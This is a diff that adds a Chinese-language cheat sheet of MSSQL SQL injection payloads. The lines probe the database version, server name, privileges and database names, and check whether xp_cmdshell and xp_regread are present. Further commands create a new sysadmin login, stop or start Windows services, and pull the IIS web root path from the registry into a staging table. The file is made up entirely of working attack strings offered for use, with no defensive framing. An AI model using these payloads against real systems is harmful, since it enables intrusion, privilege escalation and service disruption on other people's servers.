@@ -1,0 +1,45 @@
+mssql：微软的数据库名称
+
+and exists(select * from sysobjects) //判断是否是MSSQL
+
+and exists(select * from tableName) //判断某表是否存在..tableName为表名
+
+and 1=(select @@VERSION) //MSSQL版本
+
+and 1=(select db_name()) //当前数据库名
+
+and 1=(select @@servername) //本地服务名
+
+and 1=(select IS_SRVROLEMEMBER('sysadmin')) //判断是否是系统管理员
+
+and 1=(Select IS_MEMBER('db_owner')) //判断是否是库权限
+
+and 1= (Select HAS_DBACCESS('master')) //判断是否有库读取权限
+
+and 1=(select name from master.dbo.sysdatabases where dbid=1) //暴库名DBID为1，2，3....
+
+;declare @d int //是否支持多行
+
+and 1=(Select count(*) FROM master.dbo.sysobjects Where xtype = 'X' AND name = 'xp_cmdshell') //判断XP_CMDSHELL是否存在
+
+and 1=(select count(*) FROM master.dbo.sysobjects where name= 'xp_regread') //查看XP_regread扩展存储过程是不是已经被删除
+
+添加和删除一个SA权限的用户test：（需要SA权限）
+
+exec master.dbo.sp_addlogin test,password
+
+exec master.dbo.sp_addsrvrolemember test,sysadmin
+
+停掉或激活某个服务。 （需要SA权限）
+
+exec master..xp_servicecontrol 'stop','schedule'
+
+exec master..xp_servicecontrol 'start','schedule'
+
+暴网站目录
+
+create table labeng(lala nvarchar(255), id int)
+
+DECLARE @result varchar(255) EXEC master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots','/',@result output insert into labeng(lala) values(@result);
+
+and 1=(select top 1 lala from labeng) 或者and 1=(select count(*) from labeng where lala>1)
